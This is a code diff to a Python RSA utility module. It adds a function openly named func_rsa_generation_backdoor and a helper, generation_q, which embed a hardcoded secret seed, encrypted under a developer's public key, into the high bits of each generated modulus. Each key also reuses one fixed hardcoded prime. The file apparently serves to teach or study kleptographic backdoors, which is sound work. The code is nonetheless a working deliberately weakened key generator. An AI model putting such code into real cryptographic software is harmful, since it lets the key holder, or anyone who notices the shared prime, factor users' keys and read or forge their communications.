@@ -1,5 +1,7 @@
 import random
 import math
+from sha import *
+import json
 
 
 def euclid_algorithm(a, b, flag):
@@ -100,7 +102,7 @@ def func_rsa_generation(size):
 
     coefficient = euclid_algorithm(q, p, False)[1]
 
-    return (n, e, d, p, q, pow(d, 1, p - 1), pow(d, 1, q - 1), coefficient)
+    return [n, e, d, p, q, pow(d, 1, p - 1), pow(d, 1, q - 1), coefficient]
 
 
 def int_to_bytes2(x: int) -> bytes:
@@ -133,3 +135,74 @@ def bin_to_text(text):
         result += bytes.fromhex(i)
     return result.decode()
     # return bytes.fromhex(hex(int(text, 2))[2:]).decode()
+
+
+def generation_q(r: int, p: int, k: int = 512, t: int = 10):
+    r = bin(r)[2:]
+    n_len = len(bin(p)[2:]) + k
+    r_len = len(r)
+    n = r + "0" * (n_len - r_len)
+    n = int(n, 2)
+    nkp = n + (p - n % p)
+    count = 0
+    for i in bin(nkp)[2:][r_len:]:
+        if i == "0":
+            count += 1
+        else:
+            break
+    ch = 0
+    q = nkp // p
+    if q % 2 == 0:
+        ch = 1
+    flag = True
+    while flag:
+        check = 0
+        q = nkp // p
+        for i in range(1, t + 1):
+            if not test_miller2(q):
+                check = 1
+                if ch == 0:
+                    nkp = n + (p - n % p) + (p * 2 * random.randint(1, int("1" * (count - 3), 2)))
+                else:
+                    nkp = n + (p - n % p) + (p * (2 * random.randint(1, int("1" * (count - 3), 2)) + 1))
+                if bin(nkp)[2:][: r_len] != r:
+                    return -1
+                break
+        if check == 0:
+            flag = False
+    return q
+
+
+def func_rsa_generation_backdoor(size: int = 512):
+    '''s = '1' + ''.join([str(random.randint(0, 1)) for _ in range(255-2)]) + '1'
+    p = int(sha_512(s), 16)
+    while test_miller2(p) is False:
+        s = '1' + ''.join([str(random.randint(0, 1)) for _ in range(255 - 2)]) + '1'
+        p = int(sha_512(s), 16)'''
+
+    s = '101011100100001110110000000011001110010011001010011100010011100011101101000100101101000010111111000100101010000111000011011100000100001001011101111000110111101000001100100010010010101101000011111101101001000110010110111101110110111010111010001101110111101'
+    p = 166184920843844662821632920626102530303421347967623306476894956528048995256713580240171815126894258878003133298997044534559525478400111005034980007615431
+
+    _key_dev_ = json.load(open('file_key_dev.json'))
+    n_dev = _key_dev_['n']
+    e_dev = _key_dev_['e']
+
+    r = pow(int(s, 2), e_dev, n_dev)
+    q = generation_q(r, p, 512)
+
+    n = q * p
+
+    func_euler = (p - 1) * (q - 1)
+    e = random.randint(3, func_euler - 1)
+
+    d = euclid_algorithm(e, func_euler, False)[1]
+    while euclid_algorithm(e, func_euler, False)[0] != 1:
+        e = random.randint(3, func_euler - 1)
+        d = euclid_algorithm(e, func_euler, False)[1]
+    while d < 0:
+        d += func_euler
+
+    coefficient = euclid_algorithm(q, p, False)[1]
+
+    return [n, e, d, p, q, pow(d, 1, p - 1), pow(d, 1, q - 1), coefficient]
+
